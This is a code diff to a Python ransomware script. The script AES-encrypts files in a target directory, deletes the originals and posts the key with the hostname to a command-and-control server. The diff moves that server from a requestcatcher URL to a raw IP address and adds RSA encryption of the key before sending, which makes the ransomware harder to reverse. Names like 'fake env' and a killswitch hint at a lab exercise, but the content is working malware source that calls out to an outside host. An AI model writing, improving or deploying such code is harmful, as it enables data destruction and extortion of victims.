@@ -13,8 +13,11 @@ import datetime
 import os
 from pathlib import Path
 from Crypto.Cipher import AES
+from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
+from Crypto.PublicKey import RSA
+
 
 # The killswitch function
 def killswitch():
@@ -65,7 +68,7 @@ def encrypt_file(file_path, key):
         f.write(cipher.iv)
         f.write(ct_bytes)
     os.remove(file_path) # Remove the original file after encryption
-    print(f"File {file_path} has been encrypted and saved as {encrypted_file_path}")
+    # print(f"File {file_path} has been encrypted and saved as {encrypted_file_path}")
 
 # Function that managed the files encryption
 def encrypt_fake_env_files():
@@ -74,6 +77,7 @@ def encrypt_fake_env_files():
         print(f"Error: {fake_root} does not exist. Stopping.")
         return
     aes_key = generate_aes_key() # Generate the AES key
+    print(aes_key)
     send_aes_key_to_c2(aes_key)  # Sending the key to the C2 server
     files_to_encrypt = list_files_in_fake_env(fake_root) # List all files in the fake env
     if not files_to_encrypt:
@@ -84,11 +88,13 @@ def encrypt_fake_env_files():
 
 # Send the AES key to the C2 server
 def send_aes_key_to_c2(key):
-    c2_url = "https://shoubadidoulolo.requestcatcher.com/"
+    public_key = load_rsa_public_key()
+    encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
+    c2_url = "http://15.188.77.17:8999"
     hostname = socket.gethostname()  # Get computer name
     timestamp = datetime.datetime.now().isoformat()  # Get current timestamp in ISO format
     payload = {
-        "aes_key": key.hex(),         # AES key as hex string
+        "aes_key": encrypted_aes_key.hex(),  # RSA-encrypted AES key as hex string
         "hostname": hostname,
         "timestamp": timestamp
     }
@@ -97,6 +103,26 @@ def send_aes_key_to_c2(key):
         print(f"[C2] AES key sent to C2. Status code: {response.status_code}")
     except Exception as e:
         print(f"[C2] Failed to send AES key to C2: {e}")
+
+# Function to load the RSA public key
+def load_rsa_public_key():
+    public_key_pem = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnAB7GQ1uawa9iwN0KJjO
+o4NLfe6eda7MBFb41FY1/siCx0rQ9UYMrmoAl3YHyxY2X1NbJDEkE5U96warIgk6
+yukTwEsMC9vzsYTgbfIlXkHVBZiB+4XK6cFMo+syxWziqLclWlYRpqWaPiBZAKIu
+HptXUUT60b5VBZM1cKk6d5E5ASkGBm30iANIhcBG6YjWfn/MdgP4HcHmUrG9NmCa
+aosXiQxMMcFDBm8ASFSBAfER3jGmNiMYR0mVbBo6wBWAXXOLJiJiRaPPgH/wJ3S8
+/2SwexNHKWwhZ1FPvZ2E+DtVcSUi1eKBCyl9E0mtq9IjMD1nm+y9f90Lsmrq8h63
+fwIDAQAB
+-----END PUBLIC KEY-----"""
+    public_key = RSA.import_key(public_key_pem)
+    return public_key
+
+# Function to encrypt the AES key with RSA
+def encrypt_aes_key_with_rsa(aes_key, public_key):
+    cipher_rsa = PKCS1_OAEP.new(public_key)
+    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
+    return encrypted_aes_key
 
 # Main
 if killswitch():
